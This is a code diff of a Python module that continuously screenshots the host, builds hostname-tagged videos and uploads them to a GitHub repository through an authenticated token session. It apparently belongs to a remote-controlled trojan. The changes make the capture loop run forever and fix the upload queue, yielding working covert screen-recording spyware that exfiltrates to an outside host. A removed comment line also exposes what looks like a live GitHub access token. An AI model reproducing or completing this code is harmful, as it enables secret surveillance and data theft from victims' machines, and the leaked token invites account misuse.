@@ -52,16 +52,13 @@ def github_connect():
 
     user = 'agogeio'
     sess = github3.login(token=token)
-    # sess = github3.login(token='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')
     #* To allow you to specify either a username and password combination or
     #* a token, none of the parameters are required. If you provide none of
     #* them, you will receive ``None``.
-    # print(f'Session: {sess}')
 
     try:
         github = sess.repository(user, REP)
         #? Gets the requested repo
-        # print(f'GitHub Repo: {github}')
         return github
     except Exception as e:
         print(f'GitHub connection error: {e}')
@@ -73,16 +70,16 @@ class ScreenCapture:
         self.src_width, self.src_height = pyautogui.size()
         self.width = int(self.src_width)
         self.height = int(self.src_height)
-        # self.videos = []
         self.videoQueue =  queue.Queue()
 
     
     def getScreen(self):
         imgs = []
         frame = 0
-        cont = True
+        # cont = True
 
-        while cont == True:
+        # while cont == True:
+        while True:
             try:
                 image_path = f'{IMAGE_DIR}{HOSTNAME}-{frame}.{IMG_EXT}'
                 screenshot = pyautogui.screenshot()
@@ -97,17 +94,15 @@ class ScreenCapture:
             if frame > MOVIE_DURATION_IN_FRAMES:
                 self.makeMovie(imgs)
                 frame = 0
-                # cont = False
+                imgs = []
 
 
     def makeMovie(self, frames):
 
         now = datetime.now()
-        current_time = now.strftime('%Y:%-j:%H:%M:%S')
+        current_time = now.strftime('%Y-%-j-%H-%M-%S')
         video_filename = f'{HOSTNAME}-{current_time}.{VIDEO_EXT}'
         video_path = f'{VIDEO_DIR}{video_filename}'
-        
-        self.videoQueue.put(video_path)
 
         fourcc = cv2.VideoWriter_fourcc('m', 'p', '4', 'v')
         video = cv2.VideoWriter(video_path, fourcc, FPS, (self.width, self.height))
@@ -117,6 +112,8 @@ class ScreenCapture:
         for frame in frames:
             video.write(cv2.imread(frame))
         video.release()
+
+        self.videoQueue.put(video_path)
 
 
     def getVideoQueue(self):
@@ -151,47 +148,34 @@ class GithubUpload:
         except Exception as e:
             print(f'Error in store_module_result: {e}')
 
-        # try:
-        #     print(f'Removing file: {video_path}')
-        #     os.remove(video_path)
-        # except Exception as e:
-        #     print(f'Video file clean up error: {e}')
-
 
 def run(**args):
     sc = ScreenCapture()
     gu = GithubUpload()
-
     videos = sc.getVideoQueue()
 
     try:
-        print("In screen thread")
+        # print("In screen thread")
         screen_thread = threading.Thread(target=sc.getScreen)
         screen_thread.start()
-        print(f'Screen Thread Started: {threading.active_count()}')
+        # print(f'Screen Thread Started: {threading.active_count()}')
     except Exception as e:
         print(f'Screen Capture Exception: {e}')
 
-
     while True:
-
+        sleep(MOVIE_DURATION_IN_FRAMES*SLEEP_TIME)
         # screen_thread.join()
-       
+        # print('Waiting for queue get')
         video_path = videos.get()
-        print(f'Video Path: {video_path}')
+        # print(f'Video Path: {video_path}')
 
         try:
             # print("In store result")
-            # gu.store_result(video_path)
             upload_thread = threading.Thread(target=gu.store_result, args=(video_path,))
             upload_thread.start()
             print(f'Store Result Thread Started: {threading.active_count()}')
-            #! upload_thread.join()
-            #! Join did not work 
         except Exception as e:
             print(f'Store Result Exception: {e}')
-
-        # upload_thread.join()
 
 
 if __name__ == '__main__':
